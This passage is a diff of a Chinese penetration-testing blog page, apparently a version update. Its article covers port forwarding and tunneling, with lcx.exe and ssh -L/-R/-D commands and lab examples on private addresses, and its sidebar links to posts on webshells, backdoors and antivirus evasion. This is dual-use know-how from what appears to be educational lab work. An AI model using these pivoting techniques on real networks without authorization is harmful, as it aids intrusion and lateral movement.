+            <span class="post-title" title="Struts2漏洞系列">Struts2漏洞系列</span>
+            <span class="post-date" title="2019-12-20 14:38:43">2019/12/20</span>
+        </a>
+        
+        <a  class=""
+           href="/WAF/"
+           data-tag="WAF"
+           data-author="" >
+            <span class="post-title" title="WAF">WAF</span>
+            <span class="post-date" title="2020-11-26 20:35:49">2020/11/26</span>
+        </a>
+        
+        <a  class=""
+           href="/Windows%E5%AE%89%E5%85%A8/"
+           data-tag="应急响应,windows"
+           data-author="" >
+            <span class="post-title" title="Windows安全">Windows安全</span>
+            <span class="post-date" title="2020-04-10 20:48:56">2020/04/10</span>
         </a>
         
         <a  class=""
@@ -704,22 +808,6 @@
         </a>
         
         <a  class=""
-           href="/Windows%E5%AE%89%E5%85%A8/"
-           data-tag="应急响应,windows"
-           data-author="" >
-            <span class="post-title" title="Windows安全">Windows安全</span>
-            <span class="post-date" title="2020-04-10 20:48:56">2020/04/10</span>
-        </a>
-        
-        <a  class=""
-           href="/backdoors/"
-           data-tag="backdoor"
-           data-author="" >
-            <span class="post-title" title="backdoors">backdoors</span>
-            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
-        </a>
-        
-        <a  class=""
            href="/XSS/"
            data-tag="漏洞,xss,DOM,bypass"
            data-author="" >
@@ -733,6 +821,14 @@
            data-author="" >
             <span class="post-title" title="dedecms">dedecms</span>
             <span class="post-date" title="2020-08-14 21:16:51">2020/08/14</span>
+        </a>
+        
+        <a  class=""
+           href="/backdoors/"
+           data-tag="backdoor"
+           data-author="" >
+            <span class="post-title" title="backdoors">backdoors</span>
+            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
         </a>
         
         <a  class=""
@@ -760,11 +856,19 @@
         </a>
         
         <a  class=""
-           href="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"
-           data-tag="漏洞,CVE,weblogic"
+           href="/phpmyadmin/"
+           data-tag="漏洞"
            data-author="" >
-            <span class="post-title" title="Weblogic序列漏洞">Weblogic序列漏洞</span>
-            <span class="post-date" title="2019-12-25 11:09:00">2019/12/25</span>
+            <span class="post-title" title="phpmyadmin">phpmyadmin</span>
+            <span class="post-date" title="2020-05-17 20:08:29">2020/05/17</span>
+        </a>
+        
+        <a  class=""
+           href="/shell/"
+           data-tag="shell,后门"
+           data-author="" >
+            <span class="post-title" title="shell">shell</span>
+            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
         </a>
         
         <a  class=""
@@ -773,14 +877,6 @@
            data-author="" >
             <span class="post-title" title="python小脚本">python小脚本</span>
             <span class="post-date" title="2020-02-26 10:59:03">2020/02/26</span>
-        </a>
-        
-        <a  class=""
-           href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"
-           data-tag="知识,encode_decode"
-           data-author="" >
-            <span class="post-title" title="python与编码解码">python与编码解码</span>
-            <span class="post-date" title="2020-02-03 11:53:33">2020/02/03</span>
         </a>
         
         <a  class=""
@@ -800,66 +896,34 @@
         </a>
         
         <a  class=""
-           href="/phpmyadmin/"
-           data-tag="漏洞"
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"
+           data-tag="靶场,vulnhub"
            data-author="" >
-            <span class="post-title" title="phpmyadmin">phpmyadmin</span>
-            <span class="post-date" title="2020-05-17 20:08:29">2020/05/17</span>
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF5">完结-vulnhub之LAMPSecurity-CTF5</span>
+            <span class="post-date" title="2020-03-16 15:47:07">2020/03/16</span>
         </a>
         
         <a  class=""
            href="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/"
            data-tag="靶场,vulnhub"
            data-author="" >
-            <span class="post-title" title="vulnhub之LAMPSecurity-CTF4">vulnhub之LAMPSecurity-CTF4</span>
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF4">完结-vulnhub之LAMPSecurity-CTF4</span>
             <span class="post-date" title="2020-03-16 14:27:30">2020/03/16</span>
         </a>
         
         <a  class=""
-           href="/shell/"
-           data-tag="shell,后门"
+           href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"
+           data-tag="知识,encode_decode"
            data-author="" >
-            <span class="post-title" title="shell">shell</span>
-            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
-        </a>
-        
-        <a  class=""
-           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"
-           data-tag="靶场,vulnhub"
-           data-author="" >
-            <span class="post-title" title="vulnhub之LAMPSecurity-CTF5">vulnhub之LAMPSecurity-CTF5</span>
-            <span class="post-date" title="2020-03-16 15:47:07">2020/03/16</span>
-        </a>
-        
-        <a  class=""
-           href="/vulnhub%E4%B9%8BHolynix-v1/"
-           data-tag="靶场,vulnhub"
-           data-author="" >
-            <span class="post-title" title="vulnhub之Holynix-v1">vulnhub之Holynix-v1</span>
-            <span class="post-date" title="2020-03-20 15:32:27">2020/03/20</span>
-        </a>
-        
-        <a  class=""
-           href="/vulnhub%E4%B9%8BOs-hackNos-3/"
-           data-tag="靶场,vulnhub"
-           data-author="" >
-            <span class="post-title" title="vulnhub之Os-hackNos-3">vulnhub之Os-hackNos-3</span>
-            <span class="post-date" title="2020-01-02 13:21:15">2020/01/02</span>
-        </a>
-        
-        <a  class=""
-           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"
-           data-tag="靶场,vulnhub"
-           data-author="" >
-            <span class="post-title" title="vulnhub之LAMPSecurity-CTF8">vulnhub之LAMPSecurity-CTF8</span>
-            <span class="post-date" title="2020-03-18 22:32:59">2020/03/18</span>
+            <span class="post-title" title="python与编码解码">python与编码解码</span>
+            <span class="post-date" title="2020-02-03 11:53:33">2020/02/03</span>
         </a>
         
         <a  class=""
            href="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/"
            data-tag="靶场,vulnhub"
            data-author="" >
-            <span class="post-title" title="vulnhub之LAMPSecurity-CTF7">vulnhub之LAMPSecurity-CTF7</span>
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF7">完结-vulnhub之LAMPSecurity-CTF7</span>
             <span class="post-date" title="2020-03-18 14:49:09">2020/03/18</span>
         </a>
         
@@ -867,32 +931,40 @@
            href="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/"
            data-tag="靶场,vulnhub"
            data-author="" >
-            <span class="post-title" title="vulnhub之LAMPSecurity-CTF6">vulnhub之LAMPSecurity-CTF6</span>
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF6">完结-vulnhub之LAMPSecurity-CTF6</span>
             <span class="post-date" title="2020-03-17 13:51:54">2020/03/17</span>
         </a>
         
         <a  class=""
-           href="/%E5%85%8D%E6%9D%80/"
-           data-tag="bypass,远控,免杀"
-           data-author="" >
-            <span class="post-title" title="免杀">免杀</span>
-            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
-        </a>
-        
-        <a  class=""
-           href="/vulnhub%E4%B9%8Bchakravyuh/"
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"
            data-tag="靶场,vulnhub"
            data-author="" >
-            <span class="post-title" title="vulnhub之chakravyuh">vulnhub之chakravyuh</span>
-            <span class="post-date" title="2020-01-22 12:08:00">2020/01/22</span>
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF8">完结-vulnhub之LAMPSecurity-CTF8</span>
+            <span class="post-date" title="2020-03-18 22:32:59">2020/03/18</span>
         </a>
         
         <a  class=""
-           href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"
-           data-tag="知识"
+           href="/vulnhub%E4%B9%8Bdhanush/"
+           data-tag="靶场,vulnhub"
            data-author="" >
-            <span class="post-title" title="信息安全百科">信息安全百科</span>
-            <span class="post-date" title="2020-03-20 23:03:55">2020/03/20</span>
+            <span class="post-title" title="完结-vulnhub之dhanush">完结-vulnhub之dhanush</span>
+            <span class="post-date" title="2020-12-06 00:04:55">2020/12/06</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/"
+           data-tag="内网渗透,靶场,域渗透"
+           data-author="" >
+            <span class="post-title" title="完结—vulnstack红队评估一">完结—vulnstack红队评估一</span>
+            <span class="post-date" title="2021-01-03 20:11:14">2021/01/03</span>
+        </a>
+        
+        <a  class=""
+           href="/webshell/"
+           data-tag="shell,webshell,内存马"
+           data-author="" >
+            <span class="post-title" title="webshell">webshell</span>
+            <span class="post-date" title="2020-05-04 23:57:34">2020/05/04</span>
         </a>
         
         <a  class=""
@@ -904,6 +976,46 @@
         </a>
         
         <a  class=""
+           href="/%E5%85%8D%E6%9D%80/"
+           data-tag="bypass,远控,免杀"
+           data-author="" >
+            <span class="post-title" title="免杀">免杀</span>
+            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8Bchanakya/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之chanakya">完结-vulnhub之chanakya</span>
+            <span class="post-date" title="2020-12-05 21:43:10">2020/12/05</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"
+           data-tag="工具,内网渗透,windows,域渗透"
+           data-author="" >
+            <span class="post-title" title="内网渗透之windows">内网渗透之windows</span>
+            <span class="post-date" title="2020-02-20 13:44:17">2020/02/20</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
+           data-tag="漏洞,知识"
+           data-author="" >
+            <span class="post-title" title="同源策略">同源策略</span>
+            <span class="post-date" title="2020-02-02 15:18:48">2020/02/02</span>
+        </a>
+        
+        <a  class=""
+           href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="信息安全百科">信息安全百科</span>
+            <span class="post-date" title="2020-03-20 23:03:55">2020/03/20</span>
+        </a>
+        
+        <a  class=""
            href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"
            data-tag="内网渗透"
            data-author="" >
@@ -912,26 +1024,10 @@
         </a>
         
         <a  class=""
-           href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
-           data-tag="知识,漏洞"
-           data-author="" >
-            <span class="post-title" title="同源策略">同源策略</span>
-            <span class="post-date" title="2020-02-02 15:18:48">2020/02/02</span>
-        </a>
-        
-        <a  class=""
-           href="/webshell/"
-           data-tag="shell,webshell"
-           data-author="" >
-            <span class="post-title" title="webshell">webshell</span>
-            <span class="post-date" title="2020-05-04 23:57:34">2020/05/04</span>
-        </a>
-        
-        <a  class=""
            href="/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/"
            data-tag="内网渗透,靶场,域渗透"
            data-author="" >
-            <span class="post-title" title="域渗透靶场">域渗透靶场</span>
+            <span class="post-title" title="完结-域渗透靶场">完结-域渗透靶场</span>
             <span class="post-date" title="2020-07-25 23:38:38">2020/07/25</span>
         </a>
         
@@ -941,14 +1037,6 @@
            data-author="" >
             <span class="post-title" title="各端口服务漏洞">各端口服务漏洞</span>
             <span class="post-date" title="2019-12-17 20:27:22">2019/12/17</span>
-        </a>
-        
-        <a  class=""
-           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"
-           data-tag="工具,内网渗透,windows,域渗透"
-           data-author="" >
-            <span class="post-title" title="内网渗透之windows">内网渗透之windows</span>
-            <span class="post-date" title="2020-02-20 13:44:17">2020/02/20</span>
         </a>
         
         <a  class=""
@@ -968,19 +1056,27 @@
         </a>
         
         <a  class=""
-           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
-           data-tag="Linux,提权"
-           data-author="" >
-            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
-            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
-        </a>
-        
-        <a  class=""
            href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
            data-tag="linux,提权"
            data-author="" >
             <span class="post-title" title="提权之Linux">提权之Linux</span>
             <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
+           data-tag="windows,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Windows">提权之Windows</span>
+            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
+           data-tag="Linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
+            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
         </a>
         
         <a  class=""
@@ -1000,11 +1096,11 @@
         </a>
         
         <a  class=""
-           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
-           data-tag="提权"
+           href="/%E6%BA%AF%E6%BA%90/"
+           data-tag="蓝方,防守"
            data-author="" >
-            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
-            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
+            <span class="post-title" title="溯源">溯源</span>
+            <span class="post-date" title="2020-12-08 21:43:32">2020/12/08</span>
         </a>
         
         <a  class=""
@@ -1016,11 +1112,11 @@
         </a>
         
         <a  class=""
-           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
-           data-tag="windows,提权"
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
+           data-tag="提权"
            data-author="" >
-            <span class="post-title" title="提权之Windows">提权之Windows</span>
-            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
+            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
+            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
         </a>
         
         <a  class=""
@@ -1056,27 +1152,11 @@
         </a>
         
         <a  class=""
-           href="/%E8%84%B1%E5%A3%B3/"
-           data-tag="MISC,逆向"
-           data-author="" >
-            <span class="post-title" title="脱壳一">脱壳一</span>
-            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
-        </a>
-        
-        <a  class=""
            href="/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"
            data-tag="漏洞,editor"
            data-author="" >
             <span class="post-title" title="编辑器漏洞">编辑器漏洞</span>
             <span class="post-date" title="2020-08-19 12:15:10">2020/08/19</span>
-        </a>
-        
-        <a  class=""
-           href="/Web-CheckList/"
-           data-tag="知识"
-           data-author="" >
-            <span class="post-title" title="Web-CheckList">Web-CheckList</span>
-            <span class="post-date" title="2020-10-28 15:18:44">2020/10/28</span>
         </a>
         
         <a  class=""
@@ -1088,8 +1168,24 @@
         </a>
         
         <a  class=""
+           href="/Web-CheckList/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="Web-CheckList">Web-CheckList</span>
+            <span class="post-date" title="2020-10-28 15:18:44">2020/10/28</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳一">脱壳一</span>
+            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
+        </a>
+        
+        <a  class=""
            href="/%E6%97%A5%E5%BF%97/"
-           data-tag="log"
+           data-tag="log,后渗透,FTP,日志"
            data-author="" >
             <span class="post-title" title="日志">日志</span>
             <span class="post-date" title="2020-07-25 22:12:45">2020/07/25</span>
@@ -1138,7 +1234,7 @@
     <div class="article-meta">
         
         创建时间:<time class="date" title=''>2020-01-05 02:38<br/>
-        更新时间: 2020-07-15 22:59:58
+        更新时间: 2021-01-05 13:26:22
         </time>
         
     </div>
@@ -1161,7 +1257,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-隧道技术"><span class="toc-text">0x00 隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-先判断网络互通情况"><span class="toc-text">0x01 先判断网络互通情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-端口转发"><span class="toc-text">0x10 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-lcx-exe本机不同端口之间的转发（端口映射）"><span class="toc-text">0x11 lcx.exe本机不同端口之间的转发（端口映射）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-lcx-exe本地主机端口转发到远程主机端口"><span class="toc-text">0x12 lcx.exe本地主机端口转发到远程主机端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-ssh端口转发"><span class="toc-text">0x13 ssh端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-netsh端口转发"><span class="toc-text">0x14 netsh端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-MSF端口转发"><span class="toc-text">0x15 MSF端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-iptables端口转发"><span class="toc-text">0x16 iptables端口转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-NC-Ncat反弹shell"><span class="toc-text">0x20 NC/Ncat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-Windows之reGeorg与Proxifier"><span class="toc-text">0x30 Windows之reGeorg与Proxifier</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-Linux之reGeorg-proxychains"><span class="toc-text">0x40 Linux之reGeorg+proxychains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-ICMP隧道"><span class="toc-text">0x50 ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x51-icmpsh"><span class="toc-text">0x51 icmpsh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x52-ptunnel"><span class="toc-text">0x52 ptunnel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-frp"><span class="toc-text">0x60 frp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x70-Ngrok"><span class="toc-text">0x70 Ngrok</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x80-Earthworm-Proxychains"><span class="toc-text">0x80 Earthworm+Proxychains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x90-端口复用"><span class="toc-text">0x90 端口复用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x91-windows-WinRM端口复用"><span class="toc-text">0x91 windows WinRM端口复用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x92-利用HTTP-Server-API实现端口复用"><span class="toc-text">0x92 利用HTTP Server API实现端口复用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-参考"><span class="toc-text">0xFF 参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-隧道技术"><span class="toc-text">0x00 隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-先判断网络互通情况"><span class="toc-text">0x01 先判断网络互通情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-端口转发"><span class="toc-text">0x10 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-lcx-exe本机不同端口之间的转发（端口映射）"><span class="toc-text">0x11 lcx.exe本机不同端口之间的转发（端口映射）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-lcx-exe本地主机端口转发到远程主机端口"><span class="toc-text">0x12 lcx.exe本地主机端口转发到远程主机端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-ssh端口转发"><span class="toc-text">0x13 ssh端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-netsh端口转发"><span class="toc-text">0x14 netsh端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-iptables端口转发"><span class="toc-text">0x15 iptables端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-NC-Ncat反弹shell"><span class="toc-text">0x16 NC/Ncat反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x17-powercat"><span class="toc-text">0x17 powercat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x18-Metasploit-Framework-meterpreter端口转发"><span class="toc-text">0x18 Metasploit Framework/meterpreter端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x19-MSF-socks"><span class="toc-text">0x19 MSF socks</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-Windows之reGeorg与Proxifier"><span class="toc-text">0x20 Windows之reGeorg与Proxifier</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-Linux之reGeorg-proxychains"><span class="toc-text">0x30 Linux之reGeorg+proxychains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-ICMP隧道"><span class="toc-text">0x40 ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x41-icmpsh"><span class="toc-text">0x41 icmpsh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x42-ptunnel"><span class="toc-text">0x42 ptunnel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-frp"><span class="toc-text">0x50 frp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-Ngrok"><span class="toc-text">0x60 Ngrok</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x70-Earthworm-Proxychains"><span class="toc-text">0x70 Earthworm+Proxychains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x80-端口复用"><span class="toc-text">0x80 端口复用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x81-windows-WinRM端口复用"><span class="toc-text">0x81 windows WinRM端口复用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x82-利用HTTP-Server-API实现端口复用"><span class="toc-text">0x82 利用HTTP Server API实现端口复用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql代理"><span class="toc-text">mssql代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pystinger"><span class="toc-text">pystinger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-参考"><span class="toc-text">0xFF 参考</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1219,9 +1315,9 @@
 </li>
 </ol>
 <h2 id="0x01-先判断网络互通情况"><a href="#0x01-先判断网络互通情况" class="headerlink" title="0x01 先判断网络互通情况"></a>0x01 <strong>先判断网络互通情况</strong></h2><ol>
-<li>http协议，存在web，<code>curl IP:port</code></li>
+<li>http协议，存在web，<code>curl IP:port、wget http(s)://IP:port/</code></li>
 <li>tcp协议，<code>nc IP port、telnet ip port</code></li>
-<li>icmp协议，<code>ping IP/domain、tracert IP/domain</code></li>
+<li>icmp协议，<code>ping IP/domain、tracert IP/domain、pathping domain</code></li>
 <li>dns协议，nslookup domain/ip dns_ip/domain 或者 nslookup domain/ip </li>
 <li>dig @dns_ip/domain domain/ip 或者 dig domain/ip</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/26.png" alt="不通外网"></li>
@@ -1259,76 +1355,87 @@
 <li><code>lcx.exe -listen 13389 23389</code></li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/10.png" alt></li>
 </ol>
+<hr>
 <h3 id="0x13-ssh端口转发"><a href="#0x13-ssh端口转发" class="headerlink" title="0x13 ssh端口转发"></a>0x13 ssh端口转发</h3><ol>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/78.png" alt></li>
 <li><strong>ssh的参数：</strong></li>
 <li>-C：压缩传输</li>
 <li>-f：将SSH传输转入后台执行，不占用当前的shell</li>
 <li>-q：安静模式</li>
-<li>-T：不占用shell</li>
-<li>-N：建立静默连接，不执行远程命令</li>
+<li>-N：建立静默连接，不打开远程shell，不加-N则直接登录进去</li>
 <li>-n：把stdin重定向到/dev/null</li>
-<li>-g：允许远程主机连接本地用于转发的端口</li>
+<li>-g：允许远程主机连接本地用于转发的端口，即允许其他主机访问通过转发的端口</li>
 <li>-L：本地端口转发</li>
-<li>-R：远程端口转发</li>
+<li>-R：远程端口转发，将远程主机某端口转发到本地指定机器的指定端口</li>
 <li>-D：动态转发</li>
 <li></li>
-<li>HostA、HostB、HostC</li>
-<li><strong>正向代理HostA：</strong>ssh -CfNg -L HostA:portA:HostB:portB username@HostB</li>
-<li>HostA：ssh -L HostA:portA:HostC:portC username@HostB</li>
+<li><strong>正向代理</strong> #ssh默认是22端口</li>
+<li>Host1：ssh -CfNg -L Host1_IP:Host1_port:Host3_IP:Host3_port Host2_username@Host2_IP #Host1的端口转发到Host3的端口</li>
+<li>Host2：ssh -CfNg -L Host2_IP:Host2_port:Host3_IP:Host3_port Host3_username@Host3_IP #Host2的端口转发到Host3的端口，访问Host2的端口相当于访问Host3的端口</li>
 <li></li>
-<li><strong>反向代理HostA：</strong>ssh -CfNg -R HostB:portb:HostC:portC username@hostB #访问HostB:portb就相当于访问HostC:portC，条件：修改配置/etc/ssh/sshd_config，GatewayPorts yes</li>
+<li><strong>反向代理</strong></li>
+<li>Host6：ssh -CfNg -R Host2_IP:Host2_port:Host5_IP:Host5_port Host2_username@Host2_IP #访问Host2的端口就相当于访问Host5的端口，条件：修改配置/etc/ssh/sshd_config，GatewayPorts yes</li>
 <li></li>
 <li><strong>动态转发：</strong>ssh -CfNg -D 54321 root@IP</li>
 <li>浏览器设置代理：socks主机：127.0.0.1，端口：54321</li>
 </ol>
-<p><strong>例子一</strong></p>
+<p><strong>例子一：Host2把Host3:80转发到Host1:12345</strong></p>
 <ol>
-<li><strong>主机：192.168.100.1、192.168.100.4</strong></li>
-<li>192.168.100.1访问<a href="http://192.168.100.4/" target="_blank" rel="noopener">http://192.168.100.4/</a></li>
+<li><strong>主机：192.168.111.1、192.168.111.4、192.168.111.3/10.0.0.1、10.0.0.2</strong></li>
+<li>192.168.111.1访问<a href="http://10.0.0.2/" target="_blank" rel="noopener">http://10.0.0.2/</a></li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/30.png" alt></li>
-<li>192.168.100.1访问本地8888端口</li>
+<li>192.168.111.1访问本地12345端口</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/31.png" alt></li>
-<li>192.168.100.1执行转发：ssh -L 8888:192.168.100.4:80 <a href="mailto:root@192.168.100.4" target="_blank" rel="noopener">root@192.168.100.4</a></li>
-<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/33.png" alt></li>
-<li>192.168.100.1访问本地8888端口</li>
+<li>192.168.111.1执行转发：ssh -L 12345:10.0.0.2:80 <a href="mailto:root@192.168.111.3" target="_blank" rel="noopener">root@192.168.111.3</a></li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/32.png" alt></li>
+<li>192.168.111.1访问本地12345端口</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/33.png" alt></li>
+<li>192.168.111.4访问192.168.111.1:12345</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/77.png" alt></li>
 </ol>
-<p><strong>例子二</strong></p>
+<p><strong>例子二：Host2把Host6:80转发到Host2:54321</strong></p>
 <ol>
-<li><strong>主机：192.168.100.1、192.168.100.4、192.168.100.3</strong></li>
-<li><strong>192.168.100.3网站禁止192.168.100.1访问</strong></li>
-<li>192.168.100.1访问<a href="http://192.168.100.3/" target="_blank" rel="noopener">http://192.168.100.3/</a></li>
+<li><strong>主机：192.168.111.1、192.168.111.3/10.0.0.1、10.0.0.3</strong></li>
+<li>192.168.111.1访问<a href="http://192.168.111.3:54321/" target="_blank" rel="noopener">http://192.168.111.3:54321/</a></li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/34.png" alt></li>
-<li>192.168.100.4访问<a href="http://192.168.100.3/" target="_blank" rel="noopener">http://192.168.100.3/</a></li>
